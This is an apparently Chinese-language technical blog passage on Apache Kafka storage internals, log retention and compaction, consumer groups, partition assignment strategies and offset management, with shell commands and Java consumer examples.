id="文件存储机制"><a href="#文件存储机制" class="headerlink" title="文件存储机制"></a>文件存储机制</h2><p>Topic是逻辑上的概念，而partition是物理上的概念，每个partition对应于一个log文件，该log文件中存储的就是Producer生产的数据。Producer生产的数据会被不断<strong>追加</strong>到该log文件末端，为防止log文件过大导致数据定位效率低，Kafka采取了<strong>分片</strong>和<strong>索引</strong>机制， 将<strong>每个partition分为多个segment</strong>。每个segment包括：“.index”文件、“.log”文件和.timeindex等文件。这些文件位于一个文件夹下，文件夹的命名规则为：topic名称+分区序号，例如：first-0。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220306001210.png"></p><p>说明：index文件和log文件都是以当前segment的第一条消息的offset命名。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看的/opt/kafka/datas/first-1 （first-0、first-2）路径上的文件。</span></span><br><span class="line">[nanzx first-1]$ ls</span><br><span class="line">00000000000000000092.index</span><br><span class="line">00000000000000000092.log</span><br><span class="line">00000000000000000092.snapshot</span><br><span class="line">00000000000000000092.timeindex</span><br><span class="line">leader-epoch-checkpoint</span><br><span class="line">partition.metadata</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span>查看会中文乱码</span></span><br><span class="line">[nanzx first-1]$ cat 00000000000000000092.log </span><br><span class="line">\CYnF|©|©ÿÿÿÿÿÿÿÿÿÿÿÿÿÿ&quot;hello world</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用kafka的工具查看index文件</span></span><br><span class="line">[nanzx first-1]$ kafka-run-class.sh kafka.tools.DumpLogSegments --files./00000000000000000000.index</span><br><span class="line">Dumping ./00000000000000000000.index</span><br><span class="line">offset: 3 position: 152</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用kafka的工具查看<span class="built_in">log</span>文件</span></span><br><span class="line">[nanzx first-1]$ kafka-run-class.sh kafka.tools.DumpLogSegments </span><br><span class="line">--files ./00000000000000000000.log</span><br><span class="line">Dumping datas/first-0/00000000000000000000.log</span><br><span class="line">Starting offset: 0</span><br><span class="line">baseOffset: 0 lastOffset: 1 count: 2 baseSequence: -1 lastSequence: -1 producerId: -1 </span><br><span class="line">producerEpoch: -1 partitionLeaderEpoch: 0 isTransactional: false isControl: false position: </span><br><span class="line">0 CreateTime: 1636338440962 size: 75 magic: 2 compresscodec: none crc: 2745337109 isvalid: </span><br><span class="line">true</span><br><span class="line">baseOffset: 2 lastOffset: 2 count: 1 baseSequence: -1 lastSequence: -1 producerId: -1 </span><br><span class="line">producerEpoch: -1 partitionLeaderEpoch: 0 isTransactional: false isControl: false position: </span><br><span class="line">75 CreateTime: 1636351749089 size: 77 magic: 2 compresscodec: none crc: 273943004 isvalid: </span><br><span class="line">true</span><br><span class="line">baseOffset: 3 lastOffset: 3 count: 1 baseSequence: -1 lastSequence: -1 producerId: -1 </span><br><span class="line">producerEpoch: -1 partitionLeaderEpoch: 0 isTransactional: false isControl: false position: </span><br><span class="line">152 CreateTime: 1636351749119 size: 77 magic: 2 compresscodec: none crc: 106207379 isvalid: </span><br><span class="line">true</span><br><span class="line">baseOffset: 4 lastOffset: 8 count: 5 baseSequence: -1 lastSequence: -1 producerId: -1 </span><br><span class="line">producerEpoch: -1 partitionLeaderEpoch: 0 isTransactional: false isControl: false position: </span><br><span class="line">229 CreateTime: 1636353061435 size: 141 magic: 2 compresscodec: none crc: 157376877 isvalid: </span><br><span class="line">true</span><br><span class="line">baseOffset: 9 lastOffset: 13 count: 5 baseSequence: -1 lastSequence: -1 producerId: -1 </span><br><span class="line">producerEpoch: -1 partitionLeaderEpoch: 0 isTransactional: false isControl: false position: </span><br><span class="line">370 CreateTime: 1636353204051 size: 146 magic: 2 compresscodec: none crc: 4058582827 isvalid: </span><br><span class="line">true</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220306234956.png"></p><p>说明：日志存储参数配置</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>log.segment.bytes</td><td>Kafka 中 log 日志是分成一块块存储的，此配置是指 log 日志划分成块的大小，<strong>默认值 1G</strong>。</td></tr><tr><td>log.index.interval.bytes</td><td><strong>默认 4kb</strong>，kafka 里面每当写入了 4kb 大小的日志（.log），然后就往 index 文件里面记录一个索引。 稀疏索引。</td></tr></tbody></table><h2 id="文件清理策略"><a href="#文件清理策略" class="headerlink" title="文件清理策略"></a>文件清理策略</h2><p>Kafka 中<strong>默认的日志保存时间为 7 天</strong>，可以通过调整如下参数修改保存时间。</p><ul><li><p>log.retention.hours，最低优先级小时，默认 7 天。 </p></li><li><p>log.retention.minutes，分钟。 </p></li><li><p>log.retention.ms，最高优先级毫秒。 </p></li><li><p>log.retention.check.interval.ms，负责设置检查周期，默认 5 分钟。</p></li></ul><p>那么日志一旦超过了设置的时间，怎么处理呢？Kafka 中提供的日志清理策略有 delete 和 compact 两种。 </p><p><strong>delete 日志删除</strong>：将过期数据删除</p><p>log.cleanup.policy &#x3D; delete，所有数据启用删除策略</p><ul><li><p>基于时间：默认打开。以 segment 中所有记录中的<strong>最大时间戳</strong>作为该文件时间戳。如果一个 segment 中有一部分数据过期，一部分没有过期，则保留。</p></li><li><p>基于大小：默认关闭。超过设置的所有日志总大小，删除最早的 segment。log.retention.bytes，默认等于-1，表示无穷大。</p></li></ul><p><strong>compact日志压缩</strong>：对于相同key的不同value值，只保留最后一个版本。</p><p> log.cleanup.policy &#x3D; compact 所有数据启用压缩策略</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220307235402.png"></p><p>压缩后的offset可能是不连续的，比如上图中没有6，当从这些offset消费消息时，将会拿到比这个offset大的offset对应的消息，实际上会拿到offset为7的消息，并从这个位置开始消费。</p><p>这种策略只适合特殊场景，比如消息的key是用户ID，value是用户的资料，通过这种压缩策略，整个消息集里就保存了所有用户最新的资料。 </p><hr><h2 id="高效读写数据"><a href="#高效读写数据" class="headerlink" title="高效读写数据"></a>高效读写数据</h2><ul><li><p>Kafka 本身是<strong>分布式集群</strong>，可以采用<strong>分区</strong>技术，并行度高</p></li><li><p>读数据采用<strong>稀疏索引</strong>，可以快速定位要消费的数据</p></li><li><p>顺序写磁盘</p><ul><li>Kafka 的 producer 生产数据，要写入到 log 文件中，写的过程是一直<strong>追加</strong>到文件末端，为顺序写。官网有数据表明，同样的磁盘，顺序写能到 600M&#x2F;s，而随机写只有 100K&#x2F;s。这与磁盘的机械机构有关，顺序写之所以快，是因为其省去了大量磁头寻址的时间。</li></ul></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220306235743.png"></p><ul><li><p>页缓存 + 零拷贝技术</p><ul><li><p><strong>零拷贝：</strong>Kafka的数据加工处理操作交由Kafka生产者和Kafka消费者处理。Kafka Broker应用层不关心存储的数据，所以就<strong>不用走应用层</strong>，传输效率高。</p></li><li><p><strong>PageCache页缓存</strong>：Kafka重度依赖底层操作系统提供的PageCache功 能。当上层有写操作时，操作系统只是将数据写入PageCache。当读操作发生时，先从PageCache中查找，如果找不到，再去磁盘中读取。实际上PageCache是把尽可能多的空闲内存都当做了磁盘缓存来使用。</p></li></ul></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220307000053.png"></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>log.flush.interval.messages</td><td>强制页缓存刷写到磁盘的条数，默认是 long 的最大值，9223372036854775807。一般不建议修改，交给系统自己管理。</td></tr><tr><td>log.flush.interval.ms</td><td>每隔多久，刷数据到磁盘，默认是 null。一般不建议修改，交给系统自己管理。</td></tr></tbody></table><h1 id="Kafka-消费者"><a href="#Kafka-消费者" class="headerlink" title="Kafka 消费者"></a>Kafka 消费者</h1><h2 id="Kafka-消费方式"><a href="#Kafka-消费方式" class="headerlink" title="Kafka 消费方式"></a>Kafka 消费方式</h2><ul><li>Push 模式：<strong>队列推送消息给消费者</strong></li></ul><ol><li><ul><li>缺陷：由broker决定消息发送速率，很难适应所有消费者的消费速率，导致 Consumer 来不及处理消息</li></ul></li></ol><ul><li>Pull 模式：Kafka采用这种方式。<strong>消费者主动到队列中拉取</strong></li></ul><ol><li><ul><li>缺陷：如果队列中没有数据，消费者可能会陷入循环中，一直返回空数据</li></ul></li><li><ul><li>改进：设定一个 timeout 参数并在消费者消费数据时由队列传给消费者，表示消费者在没有消息处理时等待一段时间后再来拉取</li><li>Pull 模式提高消费吞吐量：<ul><li>增加 Topic 分区数，并同时增加消费者数量</li><li>提高每批次拉取的数据量，避免消费者资源浪费</li></ul></li></ul></li></ol><h2 id="消费者组"><a href="#消费者组" class="headerlink" title="消费者组"></a>消费者组</h2><p>Consumer Group：消费者组，由多个consumer组成。形成一个消费者组的条件是所有消费者的<strong>groupid相同</strong>。 </p><ul><li><p>消费者组内每个消费者负责消费不同分区的数据，<strong>一个分区只能由组内一个消费者消费</strong>。 </p></li><li><p><strong>消费者组之间互不影响</strong>。所有的消费者都属于某个消费者组，即消费者组是逻辑上的一个订阅者。</p></li><li><p>如果向消费组中添加更多的消费者，超过主题分区数量，则有一部分消费者就会<strong>闲置</strong>，不会接收任何消息。</p></li></ul><hr><h3 id="消费者组初始化流程"><a href="#消费者组初始化流程" class="headerlink" title="消费者组初始化流程"></a>消费者组初始化流程</h3><p><strong>coordinator</strong>：辅助实现消费者组的初始化和分区的分配。每个消费者的offset由消费者提交到coordinator中保存。</p><p>coordinator节点选择 &#x3D; groupid的hashcode值 % 50（ __consumer_offsets的分区数量）</p><p>例如： groupid的hashcode值 &#x3D; 1，1% 50 &#x3D; 1，那么__consumer_offsets 主题的1号分区在哪个broker上，就选择这个节点的coordinator作为这个消费者组的老大。消费者组下的所有的消费者提交offset的时候就往这个分区去提交offset。 </p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220307235316.png"></p><h3 id="消费者组详细消费流程"><a href="#消费者组详细消费流程" class="headerlink" title="消费者组详细消费流程"></a>消费者组详细消费流程</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220308000040.png"></p><h2 id="消费者重要参数列表"><a href="#消费者重要参数列表" class="headerlink" title="消费者重要参数列表"></a>消费者重要参数列表</h2><table><thead><tr><th>参数名称</th><th>描述</th></tr></thead><tbody><tr><td>bootstrap.servers</td><td>向 Kafka 集群建立初始连接用到的 host&#x2F;port 列表。</td></tr><tr><td>key.deserializer 和 value.deserializer</td><td>指定接收消息的 key 和 value 的反序列化类型。一定要写全类名。</td></tr><tr><td>group.id</td><td>标记消费者所属的消费者组。</td></tr><tr><td>enable.auto.commit</td><td><strong>默认值为 true</strong>，消费者会自动周期性地向服务器提交偏移量。</td></tr><tr><td>auto.commit.interval.ms</td><td>如果设置了 enable.auto.commit 的值为 true， 则该值定义了消费者偏移量向 Kafka 提交的频率，<strong>默认 5s</strong>。</td></tr><tr><td>auto.offset.reset</td><td>当 Kafka 中没有初始偏移量或当前偏移量在服务器中不存在<br/>（如，数据被删除了），该如何处理？ <br/>earliest：自动重置偏移量到最早的偏移量。 <br/> <strong>latest：默认</strong>，自动重置偏移量为最新的偏移量。 <br/> none：如果消费组原来的（previous）偏移量不存在，则向消费者抛异常。anything：向消费者抛异常。</td></tr><tr><td>offsets.topic.num.partitions</td><td>__consumer_offsets 的分区数，<strong>默认是 50 个分区</strong>。</td></tr><tr><td>heartbeat.interval.ms</td><td>Kafka 消费者和 coordinator 之间的心跳时间，<strong>默认 3s</strong>。<br/>该条目的值必须小于 session.timeout.ms ，也不应该高于session.timeout.ms 的 1&#x2F;3。</td></tr><tr><td>session.timeout.ms</td><td>Kafka 消费者和 coordinator 之间连接超时时间，<strong>默认 45s</strong>。<br/>超过该值，该消费者被移除，消费者组执行再平衡。</td></tr><tr><td>max.poll.interval.ms</td><td>消费者处理消息的最大时长，<strong>默认是 5 分钟</strong>。<br/>超过该值，该消费者被移除，消费者组执行再平衡。</td></tr><tr><td>fetch.min.bytes</td><td><strong>默认 1 个字节</strong>。消费者获取服务器端一批消息最小的字节数。</td></tr><tr><td>fetch.max.wait.ms</td><td><strong>默认 500ms</strong>。如果没有从服务器端获取到一批数据的最小字节数。该时间到，仍然会返回数据。</td></tr><tr><td>fetch.max.bytes</td><td>默认 Default: 52428800（<strong>50 m</strong>）。消费者获取服务器端一批消息最大的字节数。如果服务器端一批次的数据大于该值（50m）仍然可以拉取回来这批数据，因此，这不是一个绝对最大值。<br/>一批次的大小受 message.max.bytes （broker config）or max.message.bytes （topic config）影响。</td></tr><tr><td>max.poll.records</td><td>一次 poll 拉取数据返回消息的最大条数，<strong>默认是 500 条</strong>。</td></tr></tbody></table><h2 id="消费者API"><a href="#消费者API" class="headerlink" title="消费者API"></a>消费者API</h2><p><strong>注意：</strong>在消费者 API 代码中必须配置消费者组 id。命令行启动消费者不填写消费者组id会被自动填写随机的消费者组 id。 </p><p><strong>订阅主题：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">CustomCustomer</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="comment">// 1.创建消费者的配置对象</span></span><br><span class="line">     <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">     <span class="comment">// 2.给消费者配置对象添加参数</span></span><br><span class="line">     properties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;192.168.2.110:9092&quot;</span>);</span><br><span class="line">     <span class="comment">// 配置序列化 必须</span></span><br><span class="line">     properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">     properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">     <span class="comment">// 配置消费者组（组名任意起名） 必须</span></span><br><span class="line">     properties.put(ConsumerConfig.GROUP_ID_CONFIG, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 创建消费者对象</span></span><br><span class="line">     KafkaConsumer&lt;String, String&gt; kafkaConsumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(properties);</span><br><span class="line">     <span class="comment">// 注册要消费的主题（可以消费多个主题）</span></span><br><span class="line">     ArrayList&lt;String&gt; topics = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">     topics.add(<span class="string">&quot;first&quot;</span>);</span><br><span class="line">     kafkaConsumer.subscribe(topics);</span><br><span class="line">     <span class="comment">// 拉取数据打印</span></span><br><span class="line">     <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="comment">// 设置 1s 中消费一批数据</span></span><br><span class="line">         ConsumerRecords&lt;String, String&gt; consumerRecords = kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">         <span class="comment">// 打印消费到的数据</span></span><br><span class="line">         <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; consumerRecord : consumerRecords) &#123;</span><br><span class="line">             System.out.println(consumerRecord);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>订阅分区：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CustomConsumerPartition</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">    properties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;192.168.2.110:9092&quot;</span>);</span><br><span class="line">    <span class="comment">// 配置序列化 必须</span></span><br><span class="line">    properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    <span class="comment">// 配置消费者组（必须），名字可以任意起</span></span><br><span class="line">    properties.put(ConsumerConfig.GROUP_ID_CONFIG, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    KafkaConsumer&lt;String, String&gt; kafkaConsumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(properties);</span><br><span class="line">    <span class="comment">// 消费某个主题的某个分区数据</span></span><br><span class="line">    ArrayList&lt;TopicPartition&gt; topicPartitions = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    topicPartitions.add(<span class="keyword">new</span> <span class="title class_">TopicPartition</span>(<span class="string">&quot;first&quot;</span>, <span class="number">0</span>));</span><br><span class="line">    kafkaConsumer.assign(topicPartitions);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        ConsumerRecords&lt;String, String&gt; consumerRecords =</span><br><span class="line">                kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; consumerRecord :</span><br><span class="line">                consumerRecords) &#123;</span><br><span class="line">            System.out.println(consumerRecord);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分区的分配以及再平衡"><a href="#分区的分配以及再平衡" class="headerlink" title="分区的分配以及再平衡"></a>分区的分配以及再平衡</h2><p>一个消费者组中有多个consumer组成，一个 topic有多个partition组成，现在的问题是，到底由哪个consumer来消费哪个partition的数据。 </p><p>Kafka有四种主流的分区分配策略： Range、RoundRobin、Sticky、CooperativeSticky。可以通过配置参数<code>partition.assignment.strategy</code>，修改分区的分配策略。默认策略是<strong>Range + CooperativeSticky</strong>。Kafka可以同时使用多个分区分配策略。</p><p>当以下事件发生时，Kafka 将会进行一次<strong>分区分配（也称为 Rebalance 重平衡）</strong>：</p><ul><li>同一个 Consumer Group 内新增消费者（组内消费者数量变化）</li><li>消费者离开当前所属的 Consumer Group，包括 shuts down 或 crashes</li><li>订阅的主题新增分区</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改分区分配策略</span></span><br><span class="line">properties.put(ConsumerConfig.PARTITION_ASSIGNMENT_STRATEGY_CONFIG, <span class="string">&quot;org.apache.kafka.clients.consumer.RoundRobinAssignor&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Range-以及再平衡"><a href="#Range-以及再平衡" class="headerlink" title="Range 以及再平衡"></a>Range 以及再平衡</h3><p><strong>Range 分区策略原理</strong>：</p><ul><li><p>Range 是对<strong>每个 topic</strong> 而言的。</p></li><li><p>首先对同一个 topic 里面的<strong>分区按照序号进行排序</strong>，并对<strong>消费者按照字母顺序进行排序</strong>。</p><ul><li>假如现在有 7 个分区，3 个消费者，排序后的分区将会是0,1,2,3,4,5,6；消费者排序完之后将会是C0,C1,C2。</li></ul></li><li><p>通过 partitions数&#x2F;consumer数来决定每个消费者应该消费几个分区。如果除不尽，那么前面几个消费者将会多消费 1 个分区。</p><ul><li>例如，7&#x2F;3 &#x3D; 2 余 1 ，除不尽，那么 消费者 C0 便会多消费 1 个分区。 8&#x2F;3&#x3D;2余2，除不尽，那么C0和C1分别多消费一个。</li></ul></li></ul><p>注意：如果只是针对 1 个 topic 而言，C0消费者多消费1个分区影响不是很大。但是如果有 N 多个 topic，那么针对每个 topic，消费者 C0都将多消费 1 个分区，topic越多，C0消 费的分区会比其他消费者明显多消费 N 个分区。 容易产生<strong>数据倾斜</strong>！</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220313235556.png"></p><p><strong>Range 分区分配再平衡案例：</strong></p><p>（1）停止掉 0 号消费者，快速重新发送消息观看结果（45s 以内，越快越好）。 </p><ul><li><p>1 号消费者：消费到 3、4 号分区数据。 </p></li><li><p>2 号消费者：消费到 5、6 号分区数据。 </p></li><li><p>0 号消费者的任务会整体被分配到 1 号消费者或者 2 号消费者。</p></li></ul><p>说明：0 号消费者挂掉后，消费者组需要按照超时时间 45s 来判断它是否退出，所以需要等待时间到了 45s 后，判断它真的退出就会把任务分配给其他 broker 执行。</p><p>（2）再次重新发送消息观看结果（45s 以后）。 </p><ul><li><p>1 号消费者：消费到 0、1、2、3 号分区数据。 </p></li><li><p>2 号消费者：消费到 4、5、6 号分区数据。</p></li></ul><p>说明：消费者 0 已经被踢出消费者组，所以重新按照 range 方式分配。</p><hr><h3 id="RoundRobin-以及再平衡"><a href="#RoundRobin-以及再平衡" class="headerlink" title="RoundRobin 以及再平衡"></a>RoundRobin 以及再平衡</h3><p><strong>RoundRobin 分区策略原理：</strong></p><p>RoundRobin 针对集群中<strong>所有Topic</strong>而言。</p><p>RoundRobin 轮询分区策略，是把所有的 partition 和所有的consumer 都列出来，然后<strong>按照 hashcode 进行排序</strong>，最后通过<strong>轮询算法</strong>来分配 partition 给到各个消费者。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220313235342.png"></p><p><strong>RoundRobin</strong> <strong>分区分配再平衡案例</strong></p><p>（1）停止掉 0 号消费者，快速重新发送消息观看结果（45s 以内，越快越好）。 </p><ul><li><p>1 号消费者：消费到 1、4 号分区数据</p></li><li><p>2 号消费者：消费到 2、5 号分区数据</p></li><li><p>0 号消费者的任务会按照 RoundRobin 的方式，把数据轮询分成 0 、3 和 6 号分区数据，分别由 1 号消费者或者 2 号消费者消费。</p></li></ul><p>说明：0 号消费者挂掉后，消费者组需要按照超时时间 45s 来判断它是否退出，所以需要等待，时间到了 45s 后，判断它真的退出就会把任务分配给其他 broker 执行。</p><p>（2）再次重新发送消息观看结果（45s 以后）。 </p><ul><li><p>1 号消费者：消费到 0、2、4、6 号分区数据</p></li><li><p>2 号消费者：消费到 1、3、5 号分区数据</p></li></ul><p>说明：消费者 0 已经被踢出消费者组，所以重新按照 RoundRobin 方式分配。</p><hr><h3 id="Sticky-以及再平衡"><a href="#Sticky-以及再平衡" class="headerlink" title="Sticky 以及再平衡"></a>Sticky 以及再平衡</h3><p><strong>粘性分区定义：</strong>可以理解为分配的结果带有“粘性的”。即在执行一次新的分配之前，考虑上一次分配的结果，尽量少的调整分配的变动，可以节省大量的开销。</p><p>粘性分区是 Kafka 从 0.11.x 版本开始引入这种分配策略，首先会尽量均衡的放置分区到消费者上面，在同一消费者组内消费者出现问题的时候，会尽量保持原有分配的分区不变化。</p><p><strong>Sticky</strong> <strong>分区分配再平衡案例</strong></p><p>（1）停止掉 0 号消费者，快速重新发送消息观看结果（45s 以内，越快越好）。 </p><ul><li><p>1 号消费者：消费到 2、5、3 号分区数据。 </p></li><li><p>2 号消费者：消费到 4、6 号分区数据。 </p></li><li><p>0 号消费者的任务会按照粘性规则，尽可能均衡的随机分成 0 和 1 号分区数据，分别由 1 号消费者或者 2 号消费者消费。</p></li></ul><p>说明：0 号消费者挂掉后，消费者组需要按照超时时间 45s 来判断它是否退出，所以需要等待，时间到了 45s 后，判断它真的退出就会把任务分配给其他 broker 执行。</p><p>（2）再次重新发送消息观看结果（45s 以后）。 </p><ul><li><p>1 号消费者：消费到 2、3、5 号分区数据。 </p></li><li><p>2 号消费者：消费到 0、1、4、6 号分区数据。</p></li></ul><p>说明：消费者 0 已经被踢出消费者组，所以重新按照粘性方式分配。</p><hr><h2 id="offset位移"><a href="#offset位移" class="headerlink" title="offset位移"></a>offset位移</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220314235740.png"></p><p>__consumer_offsets 主题里面采用 key 和 value 的方式存储数据。<strong>key 是 group.id+topic+分区号</strong>，value 就是当前 offset 的值。每隔一段时间，kafka 内部会对这个 topic 进行compact，也就是每个group.id+topic+分区号就保留最新数据。</p><p><strong>消费 offset 案例：</strong></p><p>在配置文件 config&#x2F;consumer.properties 中添加配置 <strong>exclude.internal.topics&#x3D;false</strong>，默认是 true，表示不能消费系统主题。为了查看该系统主题数据，所以该参数修改为 false。</p><p>采用命令行方式，创建一个新的 topic：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ bin/kafka-topics.sh --bootstrap-server 192.168.2.110:9092 --create --topic mytopic --partitions 2 --replication-factor 2</span><br></pre></td></tr></table></figure><p>启动生产者往 mytopic 生产数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ bin/kafka-console-producer.sh --topic mytopic --bootstrap-server 192.168.2.110:9092</span><br></pre></td></tr></table></figure><p>启动消费者消费 mytopic 数据：</p><blockquote><p>注意：指定消费者组名称，更好观察数据存储位置（key 是 group.id+topic+分区号）。 </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ bin/kafka-console-consumer.sh --bootstrap-server 192.168.2.110:9092 --topic atguigu --group test</span><br></pre></td></tr></table></figure><p>查看消费者消费主题__consumer_offsets：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[nanzx kafka]$ bin/kafka-console-consumer.sh --topic __consumer_offsets --bootstrap-server 192.168.2.110:9092 --consumer.config config/consumer.properties --formatter </span><br><span class="line">&quot;kafka.coordinator.group.GroupMetadataManager\$OffsetsMessageFormatter&quot; --from-beginning</span><br><span class="line">...</span><br><span class="line">[test,mytopic,1]::OffsetAndMetadata(offset=7,leaderEpoch=Optional[0], metadata=,commitTimestamp=1622442520203, expireTimestamp=None)</span><br><span class="line">[test,mytopic,0]::OffsetAndMetadata(offset=8, leaderEpoch=Optional[0], metadata=,commitTimestamp=1622442520203, expireTimestamp=None)</span><br></pre></td></tr></table></figure><h3 id="自动提交-offset"><a href="#自动提交-offset" class="headerlink" title="自动提交 offset"></a>自动提交 offset</h3><p>为了使我们能够专注于自己的业务逻辑，Kafka提供了自动提交offset的功能。</p><p>自动提交offset的相关参数：</p><ul><li><p>enable.auto.commit：是否开启自动提交offset功能，<strong>默认是true</strong>，消费者会周期性自动地向服务器提交偏移量。</p></li><li><p>auto.commit.interval.ms：自动提交offset的时间间隔，默认是5s</p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220315230324.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 